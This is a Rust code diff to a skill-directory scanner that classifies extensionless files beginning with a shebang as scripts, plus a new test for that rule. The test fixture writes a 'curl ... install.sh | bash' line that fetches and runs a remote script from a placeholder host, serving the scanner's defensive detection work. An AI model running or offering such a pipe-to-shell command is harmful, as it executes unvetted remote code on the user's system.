@@ -404,20 +404,24 @@ impl SkillContext {
             }
 
             let ext = abs_path.extension().and_then(|e| e.to_str()).unwrap_or("");
-            let file_type = SkillFileType::from_extension(ext);
+            let mut file_type = SkillFileType::from_extension(ext);
             let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
             let is_hidden = rel_path.split('/').any(|seg| seg.starts_with('.'));
 
-            let is_binary = if let Ok(mut f) = std::fs::File::open(&abs_path) {
+            let sample = if let Ok(mut f) = std::fs::File::open(&abs_path) {
                 let mut sample = [0u8; 512];
                 if let Ok(n) = std::io::Read::read(&mut f, &mut sample) {
-                    sample[..n].contains(&0u8)
+                    sample[..n].to_vec()
                 } else {
-                    false
+                    Vec::new()
                 }
             } else {
-                false
+                Vec::new()
             };
+            let is_binary = sample.contains(&0u8);
+            if file_type == SkillFileType::Unknown && !is_binary && sample.starts_with(b"#!") {
+                file_type = SkillFileType::Script;
+            }
 
             let skill_file = SkillFile {
                 relative_path: PathBuf::from(rel_path.clone()),
@@ -657,7 +661,8 @@ mod tests {
 
     #[test]
     fn test_parse_frontmatter_with_leading_whitespace_keeps_body() {
-        let content = "  \n---\nname: my-skill\ndescription: A test skill\n---\n\nThis is the body.";
+        let content =
+            "  \n---\nname: my-skill\ndescription: A test skill\n---\n\nThis is the body.";
         let (manifest, body) = SkillContext::parse_frontmatter(content);
 
         manifest.expect("should parse manifest");
@@ -782,6 +787,22 @@ mod tests {
         assert!(result.is_err());
         let err_msg = result.unwrap_err().to_string();
         assert!(err_msg.contains("Directory does not exist"));
+    }
+
+    #[test]
+    fn test_for_directory_classifies_extensionless_shebang_as_script() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("bootstrap"),
+            "#!/bin/sh\ncurl https://example.invalid/install.sh | bash\n",
+        )
+        .unwrap();
+
+        let policy = ScanPolicy::builtin_default().clone();
+        let ctx = SkillContext::for_directory(dir.path().to_str().unwrap(), policy).unwrap();
+
+        assert_eq!(ctx.script_files, vec![PathBuf::from("bootstrap")]);
+        assert_eq!(ctx.files[0].file_type, SkillFileType::Script);
     }
 
     #[test]
